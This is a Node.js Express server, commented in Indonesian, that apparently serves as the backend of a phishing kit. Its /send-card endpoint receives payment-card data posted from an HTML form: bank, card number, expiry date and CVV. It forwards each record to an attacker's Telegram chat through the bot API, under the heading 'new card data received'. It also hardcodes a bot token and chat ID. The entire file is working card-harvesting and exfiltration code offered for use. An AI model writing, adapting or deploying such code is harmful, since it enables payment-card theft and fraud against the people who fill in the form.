// ==============================================
// SERVER — TERIMA DATA → KIRIM KE TELEGRAM
// ✅ SUDAH DIPASANG TOKEN & CHAT ID KAMU DI .env
// ==============================================

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

// ⚙️ Data dari file .env
const CONFIG = {
  BOT_TOKEN: process.env.BOT_TOKEN || '8686497429:AAF6Ta9LcNtLZ3vjIPjvqhtLf7_2jTL_IoE',
  CHAT_ID: process.env.CHAT_ID || '7402071395',
  PORT: process.env.PORT || 3000
};

const app = express();
app.use(cors());
app.use(express.json());

// 📤 KIRIM KE TELEGRAM
async function sendToTelegram(data) {
  if (!CONFIG.BOT_TOKEN || !CONFIG.CHAT_ID) {
    throw new Error('BOT_TOKEN atau CHAT_ID belum diatur!');
  }

  const pesan = `
🔔 <b>DATA KARTU BARU DITERIMA</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🏦 <b>Bank:</b> ${data.bank}
💳 <b>Nomor Kartu:</b> <code>${data.card_number}</code>
📅 <b>Berlaku:</b> ${data.expiry_month}/${data.expiry_year}
🔒 <b>CVV:</b> <code>${data.cvv}</code>
⏰ <b>Waktu:</b> ${new Date().toLocaleString('id-ID', {timeZone:'Asia/Jakarta'})}
━━━━━━━━━━━━━━━━━━━━━━━━━━
  `.trim();

  const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CONFIG.CHAT_ID,
      text: pesan,
      parse_mode: 'HTML'
    })
  });

  const hasil = await res.json();
  if (!res.ok) throw new Error(hasil.description || 'Error Telegram');
  return hasil;
}

// 📥 TERIMA DATA DARI HTML
app.post('/send-card', async (req, res) => {
  try {
    await sendToTelegram(req.body);
    res.json({ success: true });
  } catch (err) {
    console.error('❌', err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});

// 🚀 JALANKAN SERVER
app.listen(CONFIG.PORT, () => {
  console.log('=========================================');
  console.log('✅ SERVER BERJALAN di http://localhost:' + CONFIG.PORT);
  console.log('🤖 Bot Token:', CONFIG.BOT_TOKEN ? '✅ SUDAH TERISI' : '❌ KOSONG!');
  console.log('💬 Chat ID:', CONFIG.CHAT_ID ? '✅ SUDAH TERISI' : '❌ KOSONG!');
  console.log('=========================================');
});
